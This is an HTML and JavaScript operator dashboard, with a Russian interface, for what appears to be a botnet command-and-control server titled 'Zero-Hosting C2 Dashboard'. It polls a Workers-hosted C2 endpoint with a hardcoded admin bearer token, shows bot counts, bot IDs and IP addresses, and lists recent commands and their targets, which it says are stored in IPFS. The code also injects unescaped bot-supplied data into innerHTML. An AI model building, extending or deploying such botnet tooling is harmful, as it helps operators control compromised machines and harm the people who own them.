<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zero-Hosting C2 Dashboard</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            color: #00ff88;
            line-height: 1.6;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        header {
            background: #1a1a1a;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #00ff88;
        }
        
        h1 {
            font-size: 2em;
            margin-bottom: 10px;
            color: #00ff88;
        }
        
        .status-bar {
            display: flex;
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .status-card {
            background: #1a1a1a;
            padding: 20px;
            border-radius: 8px;
            flex: 1;
            text-align: center;
        }
        
        .status-card .value {
            font-size: 2.5em;
            font-weight: bold;
            color: #00ff88;
        }
        
        .status-card .label {
            color: #888;
            margin-top: 5px;
        }
        
        .grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .card {
            background: #1a1a1a;
            padding: 20px;
            border-radius: 8px;
        }
        
        .card h3 {
            margin-bottom: 15px;
            color: #00ff88;
            border-bottom: 1px solid #333;
            padding-bottom: 5px;
        }
        
        .card table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .card td {
            padding: 8px;
            border-bottom: 1px solid #333;
        }
        
        .card td:first-child {
            color: #888;
        }
        
        .card td:last-child {
            text-align: right;
            font-family: monospace;
        }
        
        .command-list {
            max-height: 300px;
            overflow-y: auto;
        }
        
        .command-item {
            padding: 8px;
            border-bottom: 1px solid #333;
            font-family: monospace;
            font-size: 0.9em;
        }
        
        .command-item .time {
            color: #888;
            margin-right: 10px;
        }
        
        .command-item .type {
            color: #00ff88;
            margin-right: 10px;
        }
        
        .refresh-btn {
            background: #00ff88;
            color: #0a0a0a;
            border: none;
            padding: 8px 16px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            margin-bottom: 20px;
        }
        
        .refresh-btn:hover {
            background: #00cc66;
        }
        
        .loading {
            text-align: center;
            padding: 40px;
            color: #888;
        }
        
        .error {
            color: #ff4444;
            text-align: center;
            padding: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🔮 Zero-Hosting C2 Dashboard</h1>
            <p>Статус: <span id="connection-status" style="color: #00ff88">Проверка...</span></p>
        </header>
        
        <button class="refresh-btn" onclick="loadData()">🔄 Обновить данные</button>
        
        <div class="status-bar" id="status-cards">
            <div class="status-card">
                <div class="value" id="total-bots">?</div>
                <div class="label">Всего ботов</div>
            </div>
            <div class="status-card">
                <div class="value" id="active-bots">?</div>
                <div class="label">Активных ботов</div>
            </div>
            <div class="status-card">
                <div class="value" id="total-commands">?</div>
                <div class="label">Всего команд</div>
            </div>
        </div>
        
        <div class="grid">
            <div class="card">
                <h3>📊 Статистика системы</h3>
                <table id="stats-table">
                    <tr><td>Версия</td><td id="version">-</td></tr>
                    <tr><td>Uptime</td><td id="uptime">-</td></tr>
                    <tr><td>Время сервера</td><td id="timestamp">-</td></tr>
                </table>
            </div>
            
            <div class="card">
                <h3>🤖 Список ботов</h3>
                <div id="bots-list" class="command-list">
                    <div class="loading">Загрузка...</div>
                </div>
            </div>
            
            <div class="card">
                <h3>📋 Последние команды</h3>
                <div id="commands-list" class="command-list">
                    <div class="loading">Загрузка...</div>
                </div>
            </div>
            
            <div class="card">
                <h3>🔗 IPFS</h3>
                <div id="ipfs-info">
                    <p>Команды автоматически сохраняются в IPFS</p>
                    <p>Последний хэш: <span id="last-ipfs">-</span></p>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        const WORKER_URL = 'https://long-hammer.user111leo21.workers.dev';
        const ADMIN_TOKEN = 'admin-token-6277175158';
        
        async function loadData() {
            try {
                document.getElementById('connection-status').textContent = 'Загрузка...';
                document.getElementById('connection-status').style.color = '#ffaa00';
                
                // Загружаем статус
                const statusRes = await fetch(`${WORKER_URL}/api/status`);
                const status = await statusRes.json();
                
                // Загружаем список ботов
                const botsRes = await fetch(`${WORKER_URL}/api/bots/stats`, {
                    headers: {
                        'Authorization': `Bearer ${ADMIN_TOKEN}`
                    }
                });
                const botsData = await botsRes.json();
                
                // Загружаем количество
                const countRes = await fetch(`${WORKER_URL}/api/bots/count`, {
                    headers: {
                        'Authorization': `Bearer ${ADMIN_TOKEN}`
                    }
                });
                const count = await countRes.json();
                
                updateUI(status, botsData, count);
                
                document.getElementById('connection-status').textContent = 'Онлайн';
                document.getElementById('connection-status').style.color = '#00ff88';
                
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('connection-status').textContent = 'Ошибка соединения';
                document.getElementById('connection-status').style.color = '#ff4444';
            }
        }
        
        function updateUI(status, botsData, count) {
            // Основные счётчики
            document.getElementById('total-bots').textContent = count.count || 0;
            document.getElementById('active-bots').textContent = count.active || 0;
            document.getElementById('total-commands').textContent = status.totalCommands || 0;
            
            // Статистика
            document.getElementById('version').textContent = status.version || '-';
            document.getElementById('uptime').textContent = formatUptime(status.uptime || 0);
            document.getElementById('timestamp').textContent = new Date(status.timestamp).toLocaleString();
            
            // Список ботов
            const botsList = document.getElementById('bots-list');
            if (botsData.bots && botsData.bots.length > 0) {
                botsList.innerHTML = botsData.bots.map(bot => `
                    <div class="command-item">
                        <span class="time">${new Date(bot.lastSeen).toLocaleTimeString()}</span>
                        <span class="type">${bot.id.substring(0, 8)}...</span>
                        <span>${bot.ip || 'unknown'}</span>
                    </div>
                `).join('');
            } else {
                botsList.innerHTML = '<div class="command-item">Нет активных ботов</div>';
            }
            
            // Последние команды
            const commandsList = document.getElementById('commands-list');
            if (status.commands && status.commands.length > 0) {
                commandsList.innerHTML = status.commands.map(cmd => `
                    <div class="command-item">
                        <span class="time">${new Date(cmd.timestamp).toLocaleTimeString()}</span>
                        <span class="type">${cmd.action || 'cmd'}</span>
                        <span>${cmd.target || ''}</span>
                    </div>
                `).join('');
            } else {
                commandsList.innerHTML = '<div class="command-item">Нет команд</div>';
            }
        }
        
        function formatUptime(seconds) {
            const hours = Math.floor(seconds / 3600);
            const minutes = Math.floor((seconds % 3600) / 60);
            const secs = Math.floor(seconds % 60);
            return `${hours}ч ${minutes}м ${secs}с`;
        }
        
        // Загружаем данные при старте
        loadData();
        
        // Автообновление каждые 30 секунд
        setInterval(loadData, 30000);
    </script>
</body>
</html>
